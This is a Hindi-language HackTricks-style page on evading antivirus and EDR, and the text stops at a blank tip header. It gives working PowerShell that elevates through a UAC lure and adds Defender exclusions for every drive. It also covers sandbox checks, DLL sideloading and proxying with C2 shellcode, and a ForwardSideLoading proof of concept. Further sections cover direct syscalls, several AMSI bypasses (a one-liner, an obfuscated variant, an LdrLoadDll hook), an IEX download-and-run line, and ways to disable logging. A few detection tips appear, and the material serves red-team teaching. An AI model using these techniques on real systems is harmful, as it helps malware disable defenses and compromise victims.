# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**इस पेज को सबसे पहले** [**@m2rc_p**](https://twitter.com/m2rc_p)** ने लिखा था!**

## Defender को रोकना

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender को काम करने से रोकने वाला एक टूल।
- [no-defender](https://github.com/es3n1n/no-defender): किसी दूसरे AV का रूप धारण करके Windows Defender को काम करने से रोकने वाला एक टूल।
- [यदि आप admin हैं, तो Defender को disable करें](basic-powershell-for-pentesters/README.md)

### Defender से छेड़छाड़ करने से पहले installer-शैली का UAC प्रलोभन

गेम cheats का रूप धारण करने वाले public loaders अक्सर unsigned Node.js/Nexe installers के रूप में आते हैं, जो पहले **उपयोगकर्ता से elevation मांगते हैं** और उसके बाद ही Defender को निष्क्रिय करते हैं। इसकी प्रक्रिया सरल है:

1. `net session` से जांचें कि caller के पास administrative context है या नहीं। यह command केवल तभी सफल होती है जब caller के पास admin rights हों, इसलिए विफलता का अर्थ है कि loader एक standard user के रूप में चल रहा है।
2. मूल command line को बरकरार रखते हुए, अपेक्षित UAC consent prompt दिखाने के लिए `RunAs` verb के साथ तुरंत खुद को दोबारा launch करें।

```powershell
if (-not (net session 2>$null)) {
    powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
    exit
}
```

पीड़ित पहले से ही मानते हैं कि वे “cracked” software इंस्टॉल कर रहे हैं, इसलिए वे आमतौर पर prompt स्वीकार कर लेते हैं और malware को Defender की policy बदलने के लिए ज़रूरी अधिकार मिल जाते हैं।<sup>[[26]](#references)</sup>

### हर drive letter के लिए व्यापक `MpPreference` exclusions

Elevated access मिलने के बाद, GachiLoader-जैसी chains सेवा को पूरी तरह बंद करने के बजाय Defender के blind spots को अधिकतम करती हैं। Loader पहले GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) को बंद करता है और फिर **बेहद व्यापक exclusions** जोड़ता है, ताकि हर user profile, system directory और removable disk को scan न किया जा सके:

```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```

मुख्य अवलोकन:

- यह loop हर mounted filesystem (D:\, E:\, USB sticks, आदि) पर चलता है, इसलिए **डिस्क पर कहीं भी बाद में डाला गया कोई भी payload अनदेखा रहता है**।
- `.sys` extension का exclusion भविष्य को ध्यान में रखकर किया गया है—ताकि attackers बाद में Defender को दोबारा छुए बिना unsigned drivers load करने का विकल्प सुरक्षित रख सकें।
- सभी बदलाव `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` के अंतर्गत होते हैं, जिससे बाद के stages यह पुष्टि कर सकते हैं कि exclusions बने हुए हैं या उन्हें फिर से UAC trigger किए बिना बढ़ा सकते हैं।

चूँकि Defender की कोई service बंद नहीं की जाती, इसलिए साधारण health checks “antivirus active” बताते रहते हैं, भले ही real-time inspection उन paths को कभी जाँचता ही न हो।<sup>[[26]](#references)</sup>

## **AV Evasion Methodology**

वर्तमान में, AVs यह जाँचने के लिए अलग-अलग तरीकों का इस्तेमाल करते हैं कि कोई file malicious है या नहीं: static detection, dynamic analysis और अधिक advanced EDRs के लिए behavioural analysis।

### **Static detection**

Static detection में binary या script के भीतर ज्ञात malicious strings या byte arrays को flag किया जाता है, साथ ही file से ही जानकारी निकाली जाती है (जैसे file description, company name, digital signatures, icon, checksum आदि)। इसका मतलब है कि ज्ञात public tools इस्तेमाल करने पर आपके पकड़े जाने की संभावना बढ़ सकती है, क्योंकि संभवतः उनका analysis करके उन्हें malicious के रूप में flag किया जा चुका है। इस तरह की detection से बचने के कुछ तरीके हैं:

- **Encryption**

अगर आप binary को encrypt करते हैं, तो AV के पास आपके program का पता लगाने का कोई तरीका नहीं होगा, लेकिन आपको program को memory में decrypt करके run करने के लिए किसी तरह के loader की ज़रूरत होगी।

- **Obfuscation**

कभी-कभी AV से बच निकलने के लिए अपनी binary या script में कुछ strings बदलना ही काफ़ी होता है, लेकिन आप क्या obfuscate करने की कोशिश कर रहे हैं, उसके आधार पर यह काम समय लेने वाला हो सकता है।

- **Custom tooling**

अगर आप अपने tools खुद विकसित करते हैं, तो उनकी कोई ज्ञात bad signatures नहीं होंगी, लेकिन इसमें बहुत समय और मेहनत लगती है।

> [!TIP]
> Windows Defender की static detection के विरुद्ध जाँच करने का एक अच्छा तरीका [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) है। यह file को कई segments में बाँटता है और फिर Defender से हर एक को अलग-अलग scan करवाता है। इस तरह यह आपको बता सकता है कि आपकी binary में कौन-सी strings या bytes flag हुई हैं।

व्यावहारिक AV Evasion के बारे में इस [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) को देखने की मैं पुरज़ोर सलाह देता हूँ।

### **Dynamic analysis**

Dynamic analysis में AV आपकी binary को sandbox में run करके malicious activity पर नज़र रखता है (जैसे आपके browser के passwords को decrypt करके पढ़ने की कोशिश करना, LSASS पर minidump करना आदि)। इस हिस्से के साथ काम करना थोड़ा मुश्किल हो सकता है, लेकिन sandbox से बचने के लिए आप ये कुछ चीज़ें कर सकते हैं।

- **Execution से पहले sleep करना** इसे किस तरह लागू किया गया है, इस पर निर्भर करते हुए, यह AV के dynamic analysis को bypass करने का एक शानदार तरीका हो सकता है। AVs के पास files को scan करने के लिए बहुत कम समय होता है, ताकि user के workflow में बाधा न आए। इसलिए लंबे समय तक sleep करने से binaries का analysis बाधित हो सकता है। समस्या यह है कि कई AV sandboxes, इसे किस तरह लागू किया गया है उसके आधार पर, sleep को छोड़ सकते हैं।
- **Machine के resources की जाँच करना** आम तौर पर sandboxes के पास काम करने के लिए बहुत कम resources होते हैं (जैसे < 2GB RAM), वरना वे user की machine को धीमा कर सकते हैं। आप यहाँ काफ़ी रचनात्मक भी हो सकते हैं, उदाहरण के लिए CPU का temperature या fan की speed जाँचना—हर चीज़ sandbox में लागू नहीं होगी।
- **Machine-विशिष्ट जाँचें** अगर आप ऐसे user को target करना चाहते हैं जिसका workstation "contoso.local" domain से जुड़ा है, तो आप computer का domain जाँचकर देख सकते हैं कि वह आपके बताए domain से मेल खाता है या नहीं। अगर मेल न खाए, तो आपका program exit कर सकता है।

पता चला है कि Microsoft Defender के Sandbox computername का नाम HAL9TH है। इसलिए detonation से पहले आप अपने malware में computer name की जाँच कर सकते हैं। अगर नाम HAL9TH से मेल खाता है, तो इसका मतलब है कि आप Defender के sandbox में हैं, इसलिए आप अपने program को exit करवा सकते हैं।

<figure><img src="../images/image (209).png" alt=""><figcaption><p>स्रोत: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes के विरुद्ध काम आने वाले [@mgeeky](https://twitter.com/mariuszbit) के कुछ अन्य बेहतरीन सुझाव

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

जैसा कि हमने इस post में पहले कहा है, **public tools** को अंततः **detect कर लिया जाएगा**, इसलिए आपको खुद से एक बात पूछनी चाहिए:

उदाहरण के लिए, अगर आप LSASS dump करना चाहते हैं, तो **क्या आपको सच में mimikatz इस्तेमाल करने की ज़रूरत है**? या आप कोई दूसरा कम जाना-पहचाना project इस्तेमाल कर सकते हैं, जो LSASS भी dump करता हो?

शायद दूसरा विकल्प सही है। उदाहरण के तौर पर mimikatz को लें—यह संभवतः AVs और EDRs द्वारा सबसे ज़्यादा flag किए गए malware में से एक है, अगर सबसे ज़्यादा नहीं। project अपने आप में बहुत शानदार है, लेकिन AVs से बचने के लिए इसके साथ काम करना बेहद मुश्किल है। इसलिए, जो हासिल करने की कोशिश कर रहे हैं, उसके लिए alternatives तलाशें।

> [!TIP]
> Evasion के लिए अपने payloads में बदलाव करते समय, Defender में **automatic sample submission बंद करना** सुनिश्चित करें। और कृपया, अगर आपका लक्ष्य लंबे समय तक evasion हासिल करना है, तो **VIRUSTOTAL पर UPLOAD न करें**। अगर आप जाँचना चाहते हैं कि कोई खास AV आपके payload को detect करता है या नहीं, तो उसे VM पर install करें, automatic sample submission बंद करने की कोशिश करें और नतीजे से संतुष्ट होने तक वहीं test करें।

## EXEs vs DLLs

जब भी संभव हो, evasion के लिए हमेशा **DLLs इस्तेमाल करने को प्राथमिकता दें**। मेरे अनुभव में, DLL files आम तौर पर **बहुत कम detect और analyze की जाती हैं**। इसलिए कुछ मामलों में detection से बचने के लिए यह एक बेहद आसान तरकीब है (बशर्ते आपके payload के पास DLL के रूप में run होने का कोई तरीका हो)।

जैसा कि हम इस image में देख सकते हैं, Havoc के DLL Payload की antiscan.me पर detection rate 4/26 है, जबकि EXE payload की detection rate 7/26 है।

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me पर एक सामान्य Havoc EXE payload और एक सामान्य Havoc DLL की तुलना</p></figcaption></figure>

अब हम DLL files के साथ इस्तेमाल की जा सकने वाली कुछ तरकीबें दिखाएँगे, जिनसे आप और भी ज़्यादा stealthy रह सकते हैं।

## DLL Sideloading & Proxying

**DLL Sideloading** loader द्वारा इस्तेमाल किए जाने वाले DLL search order का फ़ायदा उठाता है। इसके लिए victim application और malicious payload(s) को एक-दूसरे के साथ रखा जाता है।

[Siofra](https://github.com/Cybereason/siofra) और नीचे दी गई powershell script का इस्तेमाल करके, आप ऐसे programs ढूँढ़ सकते हैं जो DLL Sideloading के लिए susceptible हों:

```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
    $binarytoCheck = "C:\Program Files\" + $_
    C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```

यह कमांड `"C:\Program Files\\"` के अंदर DLL hijacking के प्रति संवेदनशील प्रोग्रामों की सूची और उन DLL फ़ाइलों को दिखाएगा जिन्हें वे load करने की कोशिश करते हैं।

मैं बेहद सुझाव दूँगा कि आप **DLL Hijackable/Sideloadable प्रोग्रामों को खुद explore करें**। सही तरीके से किया जाए, तो यह technique काफ़ी stealthy होती है। लेकिन अगर आप सार्वजनिक रूप से ज्ञात DLL Sideloadable प्रोग्राम इस्तेमाल करते हैं, तो आप आसानी से पकड़े जा सकते हैं।

किसी प्रोग्राम द्वारा load किए जाने की अपेक्षा वाले नाम से malicious DLL रखने भर से आपका payload load नहीं होगा, क्योंकि प्रोग्राम उस DLL के अंदर कुछ खास functions की अपेक्षा करता है। इस समस्या को ठीक करने के लिए, हम **DLL Proxying/Forwarding** नाम की एक और technique इस्तेमाल करेंगे।

**DLL Proxying** प्रोग्राम द्वारा की जाने वाली calls को proxy (और malicious) DLL से original DLL तक forward करता है। इससे प्रोग्राम की functionality बनी रहती है और आपका payload execute हो पाता है।

मैं [@flangvik](https://twitter.com/Flangvik/) के [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project का इस्तेमाल करूँगा।

मैंने ये steps अपनाए:

```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```

आखिरी कमांड हमें 2 फ़ाइलें देगा: एक DLL source code template और मूल renamed DLL।

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```

ये रहे परिणाम:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

हमारे shellcode ([SGN](https://github.com/EgeBalci/sgn) से encoded) और proxy DLL—दोनों की [antiscan.me](https://antiscan.me) पर Detection rate 0/26 है! मैं इसे सफल कहूँगा।

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading के बारे में जानने के लिए मैं **ज़ोरदार सिफ़ारिश करता हूँ** कि आप [S3cur3Th1sSh1t का twitch VOD](https://www.twitch.tv/videos/1644171543) और [ippsec का वीडियो](https://www.youtube.com/watch?v=3eROsG_WNpE) देखें। इससे हमने जिन विषयों पर चर्चा की है, उन्हें और गहराई से समझने में मदद मिलेगी।

### Forwarded Exports का दुरुपयोग (ForwardSideLoading)

Windows PE modules ऐसे functions export कर सकते हैं जो वास्तव में "forwarders" होते हैं: code की ओर संकेत करने के बजाय, export entry में `TargetDll.TargetFunc` के रूप में ASCII string होती है। जब कोई caller इस export को resolve करता है, तो Windows loader:

- `TargetDll` को लोड करेगा, अगर वह पहले से लोड न हो
- उसमें से `TargetFunc` को resolve करेगा

समझने योग्य मुख्य व्यवहार:
- अगर `TargetDll` एक KnownDLL है, तो उसे संरक्षित KnownDLLs namespace (जैसे ntdll, kernelbase, ole32) से उपलब्ध कराया जाता है।<sup>[[15]](#references)</sup>
- अगर `TargetDll` KnownDLL नहीं है, तो सामान्य DLL search order का इस्तेमाल होता है, जिसमें उस module की directory भी शामिल है जो forward resolution कर रहा है।

इससे एक अप्रत्यक्ष sideloading primitive संभव होता है: ऐसा signed DLL ढूँढें जो किसी ऐसे module name को function forward करता हो जो KnownDLL नहीं है, फिर उस signed DLL के साथ उसी directory में attacker-controlled DLL रखें जिसका नाम forwarded target module के बिल्कुल समान हो। Forwarded export को invoke करने पर loader forward को resolve करता है और उसी directory से आपका DLL लोड करता है, जिससे आपका DllMain execute होता है।<sup>[[13]](#references)</sup>

Windows 11 पर देखा गया उदाहरण:

```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```

`NCRYPTPROV.dll` KnownDLL नहीं है, इसलिए इसे सामान्य search order के ज़रिए resolve किया जाता है।

PoC (copy-paste):
1) Signed system DLL को writable folder में कॉपी करें
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) उसी फ़ोल्डर में एक malicious `NCRYPTPROV.dll` रखें। Code execution पाने के लिए एक minimal DllMain पर्याप्त है; DllMain को trigger करने के लिए forwarded function implement करने की आवश्यकता नहीं है।
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
    if (reason == DLL_PROCESS_ATTACH){
        HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}        
    }
    return TRUE;
}
```
3) signed LOLBin से forward को trigger करें:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```

देखा गया व्यवहार:
- rundll32 (signed) side-by-side `keyiso.dll` (signed) को लोड करता है
- `KeyIsoSetAuditingInterface` को resolve करते समय, loader forward होकर `NCRYPTPROV.SetAuditingInterface` तक जाता है
- इसके बाद loader `C:\test` से `NCRYPTPROV.dll` लोड करता है और उसका `DllMain` execute करता है
- अगर `SetAuditingInterface` implement नहीं किया गया है, तो `DllMain` चलने के बाद ही "missing API" error मिलेगा

Hunting के सुझाव:
- ऐसे forwarded exports पर ध्यान दें जिनका target module KnownDLL न हो। KnownDLLs `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` के अंतर्गत सूचीबद्ध हैं।
- आप इन जैसे tools का इस्तेमाल करके forwarded exports enumerate कर सकते हैं:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- उम्मीदवारों को खोजने के लिए Windows 11 forwarder inventory देखें: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Detection/defense के सुझाव:
- उन LOLBins (जैसे, rundll32.exe) की निगरानी करें जो non-system paths से signed DLLs लोड करते हैं, और फिर उसी directory से समान base name वाले non-KnownDLLs लोड करते हैं
- इस तरह की process/module chains पर alert करें: `rundll32.exe` → non-system `keyiso.dll` → user-writable paths के अंतर्गत `NCRYPTPROV.dll`
- code integrity policies (WDAC/AppLocker) लागू करें और application directories में write+execute को रोकें

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

आप Freeze का उपयोग अपने shellcode को stealthy तरीके से load और execute करने के लिए कर सकते हैं।

```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```

<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion बिल्ली-चूहे का खेल है; आज काम करने वाली तकनीक कल detect हो सकती है। इसलिए कभी भी सिर्फ़ एक tool पर निर्भर न रहें; संभव हो तो कई evasion techniques को chain करके इस्तेमाल करें।

## Direct/Indirect Syscalls और SSN Resolution (SysWhispers4)

EDR अक्सर `ntdll.dll` के syscall stubs पर **user-mode inline hooks** लगाते हैं। इन hooks को bypass करने के लिए, आप ऐसे **direct** या **indirect** syscall stubs generate कर सकते हैं जो सही **SSN** (System Service Number) load करते हैं और hooked export entrypoint को execute किए बिना kernel mode में transition करते हैं।<sup>[[32]](#references)</sup>

**Invocation के विकल्प:**
- **Direct (embedded)**: generated stub में `syscall`/`sysenter`/`SVC #0` instruction emit करें (कोई `ntdll` export hit नहीं होता)।
- **Indirect**: `ntdll` के अंदर मौजूद किसी `syscall` gadget पर jump करें, ताकि kernel transition `ntdll` से शुरू होता हुआ दिखाई दे (heuristic evasion के लिए उपयोगी); **randomized indirect** हर call पर एक pool से gadget चुनता है।
- **Egg-hunt**: disk पर static `0F 05` opcode sequence embed करने से बचें; runtime पर syscall sequence resolve करें।

**Hook-resistant SSN resolution की रणनीतियाँ:**
- **FreshyCalls (VA sort)**: stub bytes पढ़ने के बजाय syscall stubs को virtual address के आधार पर sort करके SSN का अनुमान लगाएँ।
- **SyscallsFromDisk**: एक clean `\KnownDlls\ntdll.dll` map करें, उसके `.text` से SSN पढ़ें, फिर उसे unmap करें (memory में मौजूद सभी hooks को bypass करता है)।
- **RecycledGate**: VA-sorted SSN inference को opcode validation के साथ जोड़ता है, जब stub clean हो; hooked होने पर VA inference पर fallback करता है।
- **HW Breakpoint**: `syscall` instruction पर DR0 set करें और runtime पर `EAX` से SSN capture करने के लिए VEH इस्तेमाल करें, hooked bytes को parse किए बिना।

SysWhispers4 के इस्तेमाल का उदाहरण:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```

## AMSI (Anti-Malware Scan Interface)

AMSI को "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" को रोकने के लिए बनाया गया था। शुरुआत में, AVs केवल **डिस्क पर मौजूद फ़ाइलों** को scan कर सकते थे, इसलिए अगर आप किसी तरह payloads को **सीधे memory में** execute कर पाते, तो AV उसे रोकने के लिए कुछ नहीं कर पाता, क्योंकि उसे पर्याप्त visibility नहीं मिलती थी।

AMSI feature Windows के इन components में integrated है।

- User Account Control, या UAC (EXE, COM, MSI, या ActiveX installation को elevate करना)
- PowerShell (scripts, interactive use, और dynamic code evaluation)
- Windows Script Host (wscript.exe और cscript.exe)
- JavaScript और VBScript
- Office VBA macros

यह antivirus solutions को script contents ऐसे रूप में उपलब्ध कराकर script behavior inspect करने देता है, जो unencrypted और unobfuscated होता है।

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` चलाने पर Windows Defender में निम्नलिखित alert दिखाई देगा।

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

ध्यान दें कि यह `amsi:` जोड़ता है और फिर उस executable का path देता है जिससे script चला था; इस मामले में, powershell.exe

हमने डिस्क पर कोई फ़ाइल नहीं डाली, फिर भी AMSI की वजह से memory में ही पकड़े गए।

इसके अलावा, **.NET 4.8** से शुरू होकर, C# code भी AMSI से होकर गुजरता है। इसका असर `Assembly.Load(byte[])` पर भी पड़ता है, जिसका उपयोग memory में execution load करने के लिए होता है। इसीलिए, अगर आप AMSI से बचते हुए memory में execution करना चाहते हैं, तो .NET के पुराने versions (जैसे 4.7.2 या उससे कम) का उपयोग करने की सलाह दी जाती है।

AMSI से बचने के कुछ तरीके हैं:

- **Obfuscation**

AMSI मुख्य रूप से static detections पर काम करता है, इसलिए जिन scripts को आप load करने की कोशिश कर रहे हैं, उनमें बदलाव करना detection से बचने का एक अच्छा तरीका हो सकता है।

हालाँकि, AMSI कई layers वाली obfuscation के बावजूद scripts को unobfuscate कर सकता है, इसलिए इसे किस तरह किया गया है, इसके आधार पर obfuscation एक खराब विकल्प हो सकता है। इससे detection से बचना इतना सीधा नहीं रह जाता। फिर भी, कभी-कभी बस कुछ variable names बदलना ही काफ़ी होता है, इसलिए यह इस बात पर निर्भर करता है कि किसी चीज़ को किस हद तक flag किया गया है।

- **AMSI Bypass**

चूँकि AMSI, powershell (और cscript.exe, wscript.exe आदि) process में DLL load करके implement किया जाता है, इसलिए unprivileged user के रूप में चलते हुए भी इसके साथ आसानी से छेड़छाड़ की जा सकती है। AMSI के implementation में इस flaw के कारण, researchers ने AMSI scanning से बचने के कई तरीके खोजे हैं।

**Forcing an Error**

AMSI initialization को fail करवाने (`amsiInitFailed`) से मौजूदा process के लिए कोई scan शुरू नहीं होगा। इसे सबसे पहले [Matt Graeber](https://twitter.com/mattifestation) ने disclose किया था और Microsoft ने इसके बड़े पैमाने पर इस्तेमाल को रोकने के लिए एक signature विकसित किया है।

```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

AMSI को मौजूदा powershell process के लिए अनुपयोगी बनाने के लिए powershell code की बस एक लाइन की जरूरत थी। बेशक, इस लाइन को खुद AMSI ने flag कर दिया है, इसलिए इस technique का इस्तेमाल करने के लिए इसमें कुछ बदलाव करना जरूरी है।

यहाँ एक modified AMSI bypass है, जिसे मैंने इस [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) से लिया है।

```bash
Try{#Ams1 bypass technic nº 2
      $Xdatabase = 'Utils';$Homedrive = 'si'
      $ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
      $DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
      $fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
      $CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
      $Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
      $SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
      $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
      $Spotfix.SetValue($null,$true)
   }Catch{Throw $_}
```

ध्यान रखें कि यह पोस्ट प्रकाशित होने के बाद संभवतः flag हो जाएगी, इसलिए अगर आपकी योजना का हिस्सा undetected रहना है, तो कोई code प्रकाशित नहीं करना चाहिए।

**Memory Patching**

इस technique की शुरुआत में खोज [@RastaMouse](https://twitter.com/_RastaMouse/) ने की थी। इसमें amsi.dll में "AmsiScanBuffer" function (जो user-supplied input को scan करने के लिए ज़िम्मेदार है) का address ढूँढ़कर उसे ऐसे instructions से overwrite किया जाता है जो E_INVALIDARG का code लौटाते हैं। इस तरह, वास्तविक scan का परिणाम 0 लौटता है, जिसे clean result माना जाता है।

> [!TIP]
> अधिक विस्तृत जानकारी के लिए [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) पढ़ें।

powershell के साथ AMSI bypass करने के कई अन्य तरीके भी हैं। उनके बारे में जानने के लिए [**इस page**](basic-powershell-for-pentesters/index.html#amsi-bypass) और [**इस repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) को देखें।

### amsi.dll को load होने से रोककर AMSI को block करना (LdrLoadDll hook)

AMSI तभी initialize होता है जब `amsi.dll` मौजूदा process में load हो जाती है। एक मज़बूत, language-agnostic bypass के लिए `ntdll!LdrLoadDll` पर user-mode hook लगाया जाता है, जो अनुरोधित module `amsi.dll` होने पर error लौटाता है। इसके परिणामस्वरूप, AMSI कभी load नहीं होता और उस process के लिए कोई scan नहीं होता।<sup>[[23]](#references)</sup>

Implementation का खाका (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
    if (module && module->Buffer){
        UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
        if (RtlEqualUnicodeString(module, &amsi, TRUE)){
            // Pretend the DLL cannot be found → AMSI never initialises in this process
            return STATUS_DLL_NOT_FOUND; // 0xC0000135
        }
    }
    return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
    // Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
    // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
नोट्स
- यह PowerShell, WScript/CScript और custom loaders—सभी पर काम करता है (यानी ऐसी किसी भी चीज़ पर जो अन्यथा AMSI लोड करती)।
- लंबी command-line artefacts से बचने के लिए, scripts को stdin के ज़रिए भेजने के साथ इसका उपयोग करें (`PowerShell.exe -NoProfile -NonInteractive -Command -`)।
- इसे LOLBins के ज़रिए चलाए गए loaders में इस्तेमाल होते देखा गया है (जैसे, `regsvr32` द्वारा `DllRegisterServer` को कॉल करना)।

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** tool भी AMSI को bypass करने के लिए script बनाता है।
**[https://amsibypass.com/](https://amsibypass.com/)** tool भी AMSI को bypass करने वाली script बनाता है, जो randomized user-defined function, variables और character expressions का उपयोग करके signature से बचती है, और signature से बचने के लिए PowerShell keywords के अक्षरों का casing भी randomize करती है।

**पहचानी गई signature हटाएँ**

आप मौजूदा process की memory से पहचानी गई AMSI signature हटाने के लिए **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** और **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** जैसे tool का उपयोग कर सकते हैं। यह tool मौजूदा process की memory में AMSI signature खोजता है और फिर उसे NOP instructions से overwrite करता है, जिससे वह memory से हट जाती है।

**AMSI का उपयोग करने वाले AV/EDR products**

AMSI का उपयोग करने वाले AV/EDR products की सूची **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** में मिल सकती है।

**Powershell version 2 का उपयोग करें**
यदि आप PowerShell version 2 का उपयोग करते हैं, तो AMSI लोड नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। आप यह कर सकते हैं:

```bash
powershell.exe -version 2
```

## PS Logging

PowerShell logging एक सुविधा है, जो सिस्टम पर चलाए गए सभी PowerShell commands को log करने देती है। यह auditing और troubleshooting के लिए उपयोगी हो सकती है, लेकिन **detection से बचना चाहने वाले attackers के लिए समस्या भी बन सकती है**।

PowerShell logging को bypass करने के लिए, आप ये techniques इस्तेमाल कर सकते हैं:

- **PowerShell Transcription और Module Logging को Disable करें**: इस काम के लिए [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) जैसे tool का उपयोग कर सकते हैं।
- **Powershell version 2 का उपयोग करें**: अगर आप PowerShell version 2 इस्तेमाल करते हैं, तो AMSI load नहीं होगा, इसलिए आप अपनी scripts को AMSI द्वारा scan किए बिना चला सकते हैं। ऐसा करने के लिए: `powershell.exe -version 2`
- **एक unmanaged PowerShell session का उपयोग करें**: `powershell.exe` launch किए बिना PowerShell host करने के लिए [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) का उपयोग करें (यह Cobalt Strike के `powerpick` में इस्तेमाल किया गया तरीका है)। इससे खास तौर पर `powershell.exe` process से जुड़े controls से बचा जा सकता है, लेकिन यह अपने-आप AMSI, Script Block Logging या अन्य सभी PowerShell defenses को disable नहीं करता; coverage runtime और host implementation पर निर्भर करती है।


## Obfuscation

> [!TIP]
